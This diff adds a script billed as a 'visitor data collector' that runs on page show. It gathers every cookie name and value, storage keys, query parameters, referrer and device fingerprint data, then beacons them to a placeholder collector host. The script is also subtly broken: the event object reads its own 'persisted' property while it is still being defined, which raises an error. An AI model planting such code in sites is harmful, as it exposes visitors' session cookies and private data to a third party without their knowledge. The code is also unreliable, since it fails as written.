@@ -1,0 +1,220 @@
+<!-- 
+  Comprehensive Visitor Data Collector
+  Embed this script in your HTML pages to collect ALL document, cookie, browser, 
+  and request metadata. Replace YOUR-APPROVED-COLLECTOR.example with your collector URL.
+-->
+<script>
+addEventListener("pageshow", () => {
+  // ============= URL & Location Information =============
+  const url = new URL(location.href);
+  const query = new URLSearchParams(location.search);
+  
+  // ============= Cookie Information =============
+  const allCookies = document.cookie
+    .split(";")
+    .filter(c => c.trim())
+    .map(c => {
+      const [name, ...valueParts] = c.split("=");
+      return {
+        name: name.trim(),
+        value: valueParts.join("=").trim()
+      };
+    });
+
+  const cookieNames = allCookies.map(c => c.name);
+  const cookieCount = allCookies.length;
+
+  // ============= Document Information =============
+  const documentInfo = {
+    title: document.title,
+    url: document.URL,
+    location: document.location.href,
+    referrer: document.referrer,
+    domain: document.domain,
+    charset: document.characterSet,
+    language: document.language,
+    readyState: document.readyState,
+    visibilityState: document.visibilityState,
+    lastModified: document.lastModified,
+    cookie: document.cookie,
+    compatMode: document.compatMode,
+    designMode: document.designMode
+  };
+// ============= Browser & Navigator Information =============
+  const browserInfo = {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    languages: navigator.languages || [],
+    appName: navigator.appName,
+    appVersion: navigator.appVersion,
+    product: navigator.product,
+    vendor: navigator.vendor,
+    vendorSub: navigator.vendorSub,
+    hardwareConcurrency: navigator.hardwareConcurrency || null,
+    deviceMemory: navigator.deviceMemory || null,
+    maxTouchPoints: navigator.maxTouchPoints || null,
+    cookieEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack,
+    connection: {
+      type: navigator.connection?.type || null,
+      effectiveType: navigator.connection?.effectiveType || null,
+      downlink: navigator.connection?.downlink || null,
+      rtt: navigator.connection?.rtt || null,
+      saveData: navigator.connection?.saveData || null
+    },
+    onLine: navigator.onLine
+  };
+
+  // ============= Screen Information =============
+  const screenInfo = {
+    width: screen.width,
+    height: screen.height,
+    availWidth: screen.availWidth,
+    availHeight: screen.availHeight,
+    colorDepth: screen.colorDepth,
+    pixelDepth: screen.pixelDepth,
+    orientation: screen.orientation ? {
+      type: screen.orientation.type,
+      angle: screen.orientation.angle
+    } : null
+  };
+// ============= Window Information =============
+  const windowInfo = {
+    innerWidth: window.innerWidth,
+    innerHeight: window.innerHeight,
+    outerWidth: window.outerWidth,
+    outerHeight: window.outerHeight,
+    screenX: window.screenX,
+    screenY: window.screenY,
+    devicePixelRatio: window.devicePixelRatio,
+    scrollX: window.scrollX,
+    scrollY: window.scrollY,
+    scrollMaxX: window.scrollMaxX,
+    scrollMaxY: window.scrollMaxY,
+    visualViewport: window.visualViewport ? {
+      width: window.visualViewport.width,
+      height: window.visualViewport.height,
+      scale: window.visualViewport.scale,
+      offsetLeft: window.visualViewport.offsetLeft,
+      offsetTop: window.visualViewport.offsetTop
+    } : null
+  };
+
+  // ============= History Information =============
+  const historyInfo = {
+    length: history.length,
+    state: history.state || null
+  };
+
+  // ============= Storage Information =============
+  const storageInfo = {
+    localStorage: {
+      enabled: !!window.localStorage,
+      keys: window.localStorage ? Object.keys(localStorage) : [],
+      keyCount: window.localStorage ? localStorage.length : 0
+    },
+    sessionStorage: {
+      enabled: !!window.sessionStorage,
+      keys: window.sessionStorage ? Object.keys(sessionStorage) : [],
+      keyCount: window.sessionStorage ? sessionStorage.length : 0
+    }
+  };
+
+  // ============= Security Context =============
+  const securityInfo = {
+    isSecureContext: window.isSecureContext,
+    protocol: location.protocol,
+    isHttps: location.protocol === 'https:'
+  };
+// ============= Performance Timing (if available) =============
+  const performanceInfo = {
+    navigationStart: performance?.timing?.navigationStart || null,
+    fetchStart: performance?.timing?.fetchStart || null,
+    dnsLookup: (performance?.timing?.domainLookupEnd - performance?.timing?.domainLookupStart) || null,
+    tcpConnect: (performance?.timing?.connectEnd - performance?.timing?.connectStart) || null,
+    tlsHandshake: (performance?.timing?.secureConnectionStart - performance?.timing?.connectStart) || null,
+    requestStart: performance?.timing?.requestStart || null,
+    responseStart: performance?.timing?.responseStart || null,
+    responseEnd: performance?.timing?.responseEnd || null,
+    domContentLoaded: performance?.timing?.domContentLoadedEventEnd - performance?.timing?.domContentLoadedEventStart || null,
+    loadComplete: performance?.timing?.loadEventEnd - performance?.timing?.loadEventStart || null,
+    domInteractive: performance?.timing?.domInteractive || null,
+    domComplete: performance?.timing?.domComplete || null,
+    redirectCount: performance?.getEntriesByType?.('navigation')?.[0]?.redirectCount || null
+  };
+
+  // ============= Build Query Parameters Object =============
+  const queryParameters = {};
+  query.forEach((value, key) => {
+    queryParameters[key] = value;
+  });
+// ============= Build Complete Event Object =============
+  const event = {
+    // Core Identification
+    test: "ienergy",
+    timestamp: new Date().toISOString(),
+    pageShowEvent: {
+      type: "pageshow",
+      persisted: event.persisted
+    },
+
+    // URL Information
+    url: {
+      full: location.href,
+      origin: location.origin,
+      pathname: location.pathname,
+      search: location.search,
+      hash: location.hash,
+      host: location.host,
+      hostname: location.hostname,
+      port: location.port,
+      protocol: location.protocol,
+      queryParameters: queryParameters,
+      queryParameterCount: query.size
+    },
+
+    // Cookie Information
+    cookies: {
+      count: cookieCount,
+      names: cookieNames,
+      all: allCookies
+    },
+
+    // Document Information
+    document: documentInfo,
+
+    // Browser Information
+    browser: browserInfo,
+
+    // Screen Information
+    screen: screenInfo,
+
+    // Window Information
+    window: windowInfo,
+
+    // History Information
+    history: historyInfo,
+
+    // Storage Information
+    storage: storageInfo,
+
+    // Security Information
+    security: securityInfo,
+
+    // Performance Information
+    performance: performanceInfo
+  };
+
+  // ============= Send Data to Collector =============
+  const collectorUrl = "https://YOUR-APPROVED-COLLECTOR.example/visit";
+  
+  const blob = new Blob([JSON.stringify(event)], { type: "application/json" });
+  
+  const success = navigator.sendBeacon(collectorUrl, blob);
+  
+  if (typeof console !== 'undefined') {
+    console.log(`Visitor data ${success ? 'successfully sent' : 'failed to send'} to collector`);
+  }
+});
+</script>
